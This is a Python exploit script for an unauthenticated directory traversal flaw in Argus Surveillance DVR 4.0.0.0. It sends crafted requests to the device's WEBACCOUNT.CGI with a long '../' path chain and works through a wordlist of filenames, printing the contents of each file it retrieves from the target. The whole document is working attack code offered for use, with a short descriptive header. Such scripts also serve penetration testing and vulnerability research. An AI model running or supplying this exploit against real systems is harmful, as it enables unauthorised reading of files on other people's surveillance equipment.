#!/usr/bin/python3

# Exploit: Argus Surveillance DVR 4.0.0.0 - Directory Traversal
# Vendor: www.argussurveillance.com
#
# Description:
# This script uses the Argus Surveillance DVR 4.0.0.0 exploit that allows Unauthenticated Directory Traversal to  
# iterate over usernames searching for a file in a web root path.
import argparse
import requests
import pentest.wordlist as wordlist


def search_files(ip, filenames):

    URL = "http://" + ip + ":8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE="
    LFI = "../../../../../../../../../../../../../../../../"
    QUERY = "&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

    for file in filenames:
        path = "Inetpub/wwwroot/html/{}".format(file)
        payload = URL + LFI + path + QUERY
        response = requests.get(payload)
        if response.status_code == 200 and "<HTML>" not in response.text:
            print("File found: ", file)
            print("Response: ")
            print(response.text, "\n")



def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="ip of target.")
    parser.add_argument("file", help="file of possible filenames.")
    args = parser.parse_args()

    filename_list = wordlist.Wordlist(args.file).words
    search_files(args.ip, filename_list)


if __name__ == "__main__":
    main()
